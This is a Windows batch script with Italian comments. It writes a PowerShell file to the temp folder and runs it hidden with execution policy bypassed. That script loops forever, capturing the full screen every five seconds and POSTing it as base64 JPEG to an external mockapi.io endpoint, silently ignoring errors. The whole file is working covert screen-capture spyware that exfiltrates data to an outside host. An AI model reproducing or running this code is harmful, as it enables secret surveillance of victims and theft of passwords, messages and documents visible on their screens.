@echo off
:: Batch modificato per screenshot e invio a server REST
:: Server: https://68e161518943bf6bb3c41597.mockapi.io/api/v1/Image
:: Intervallo: 5 secondi

setlocal enabledelayedexpansion

:: Configurazione server
set "server=https://68e161518943bf6bb3c41597.mockapi.io/api/v1/Image"

:: Creare lo script PowerShell offuscato
echo $s='https://68e161518943bf6bb3c41597.mockapi.io/api/v1/Image' > %temp%\s.ps1
echo $t=5 >> %temp%\s.ps1
echo Add-Type -AssemblyName System.Windows.Forms >> %temp%\s.ps1
echo Add-Type -AssemblyName System.Drawing >> %temp%\s.ps1
echo Add-Type -AssemblyName System.Web >> %temp%\s.ps1
echo while($true){ >> %temp%\s.ps1
echo try{ >> %temp%\s.ps1
echo $sc=[System.Windows.Forms.SystemInformation]::VirtualScreen >> %temp%\s.ps1
echo $b=New-Object System.Drawing.Bitmap($sc.Width,$sc.Height) >> %temp%\s.ps1
echo $g=[System.Drawing.Graphics]::FromImage($b) >> %temp%\s.ps1
echo $g.CopyFromScreen($sc.X,$sc.Y,0,0,$b.Size) >> %temp%\s.ps1
echo $ms=New-Object System.IO.MemoryStream >> %temp%\s.ps1
echo $b.Save($ms,[System.Drawing.Imaging.ImageFormat]::Jpeg) >> %temp%\s.ps1
echo $b.Dispose() >> %temp%\s.ps1
echo $g.Dispose() >> %temp%\s.ps1
echo $bytes=$ms.ToArray() >> %temp%\s.ps1
echo $ms.Dispose() >> %temp%\s.ps1
echo $base64=[Convert]::ToBase64String($bytes) >> %temp%\s.ps1
echo $body=@{\"image\"=\"data:image/jpeg;base64,$base64\";\"timestamp\"=(Get-Date -Format \"yyyy-MM-dd HH:mm:ss\")} >> %temp%\s.ps1
echo $json=$body ^| ConvertTo-Json >> %temp%\s.ps1
echo $wr=[System.Net.WebRequest]::Create($s) >> %temp%\s.ps1
echo $wr.Method=\"POST\" >> %temp%\s.ps1
echo $wr.ContentType=\"application/json\" >> %temp%\s.ps1
echo $sw=New-Object System.IO.StreamWriter($wr.GetRequestStream()) >> %temp%\s.ps1
echo $sw.Write($json) >> %temp%\s.ps1
echo $sw.Close() >> %temp%\s.ps1
echo $r=$wr.GetResponse() >> %temp%\s.ps1
echo $r.Close() >> %temp%\s.ps1
echo }catch{} >> %temp%\s.ps1
echo Start-Sleep -Seconds $t >> %temp%\s.ps1
echo } >> %temp%\s.ps1

:: Eseguire in background
start /B /MIN powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%temp%\s.ps1"

exit
